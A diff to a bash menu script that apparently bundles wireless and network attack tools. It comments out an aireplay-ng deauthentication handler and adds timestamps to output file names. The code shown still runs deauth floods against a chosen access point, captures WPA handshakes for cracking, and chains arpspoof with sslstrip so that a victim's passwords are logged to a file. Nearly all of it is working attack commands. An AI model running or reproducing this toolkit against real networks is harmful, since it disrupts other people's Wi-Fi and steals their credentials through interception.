@@ -86,7 +86,7 @@ while [ exit != 2 ]; do
 		clean_mon "Cleans up monitor mode if not cleaned up properly"\
 		airodump "Airodump-ng + Airmon-ng" \
 		airodump2 "Airodump-ng bssid specific" \
-		aireplay "Aireplay-ng" \
+		#aireplay "Launches aireplay"\
 		pyrit "Pyrit (for caps)" \
 		sslstrip "SSLStrip" \
 		ettercap "Open ettercap GUI" 2>CHOICE \
@@ -132,24 +132,25 @@ while [ exit != 2 ]; do
 		monitor_cleanup
 	;;
 	#takes host and client.
-	aireplay) whiptail --inputbox "Please enter host bssid:" 25 50 2>AIREPLAYHOST
-		whiptail --inputbox "Please enter a client ("null" if no client):" 25 50 2>AIREPLAYCLIENT
-		AIREPLAYHOST=$(cat AIREPLAYHOST)
-		AIREPLAYCLIENT=$(cat AIREPLAYCLIENT)
-		
-		#Launches airodump in an xterm window and then waits for it to start up
-		xterm -e airodump-ng --bssid $AIREPLAYHOST -w Caps/BigProgram mon0 &
-		echo "Waiting for airodump to start..."
-		sleep 5s
-		
-		#starts deauth if AIREPLAY client is set using the vars inputed
-		if [ $AIREPLAYCLIENT != "null" ]; then
-			aireplay-ng --deauth 100 -a $AIREPLAYHOST -c $AIREPLAYCLIENT --ignore-negative-one mon0
-		else
-			aireplay-ng --deauth 100 -a $AIREPLAYHOST --ignore-negative-one mon0
-		fi
-		monitor_cleanup
-	;;
+	#aireplay) whiptail --inputbox "Please enter host bssid:" 25 50 2>AIREPLAYHOST
+	#	whiptail --inputbox "Please enter a client ("null" if no client):" 25 50 2>AIREPLAYCLIENT
+	#	AIREPLAYHOST=$(cat AIREPLAYHOST)
+	#	AIREPLAYCLIENT=$(cat AIREPLAYCLIENT)
+	#	
+	#	#Launches airodump in an xterm window and then waits for it to start up
+	#	xterm -e airodump-ng --bssid $AIREPLAYHOST -w Caps/BigProgram mon0 &
+	#	echo "Waiting for airodump to start..."
+	#	sleep 5s
+	#	
+	#	#starts deauth if AIREPLAY client is set using the vars inputed
+	#	if [ $AIREPLAYCLIENT != "null" ]; then
+	#		aireplay-ng --deauth 100 -a $AIREPLAYHOST -c $AIREPLAYCLIENT --ignore-negative-one mon0
+	#	else
+	#		aireplay-ng --deauth 100 -a $AIREPLAYHOST --ignore-negative-one mon0
+	#	fi
+	#	monitor_cleanup
+	#;;
+	##see deauth
 	
 	#lel cracking passwords on a raspberry pi will be difficult
 	#Starts a cracker, Pyrit, on a cap file using a specified wordlist
@@ -175,7 +176,7 @@ while [ exit != 2 ]; do
 		xterm -e arpspoof -i $current_interface -t $ARPSPOOFCLIENT $ARPSPOOFHOST &
 		
 		#launches sslstrip Passwords will be displayed on screen and logged in sslstrip.log (may wish to add some kind of time stamping in the name... Oh well)
-		sslstrip -k -l 8080 -w /root/Desktop/sslstrip.log 
+		sslstrip -k -l 8080 -w /root/Desktop/sslstrip.$(date | sed -e 's/ /_/g').log 
 	
 		echo "Press enter to terminate..."
 		read enter
@@ -202,7 +203,7 @@ while [ exit != 2 ]; do
 	pcap_capture) airmon-ng start $current_interface
 			Nearby_Mac
 			xterm -e aireplay-ng -0 10 -a $TARGETAP mon0 --ignore-negative-one &
-			airodump-ng --bssid $TARGETAP -w psk mon0
+			airodump-ng --bssid $TARGETAP -w psk.$(date | sed -e 's/ /_/g') mon0
 			clean_mon
 	;;
 	#exits the loop of eternity
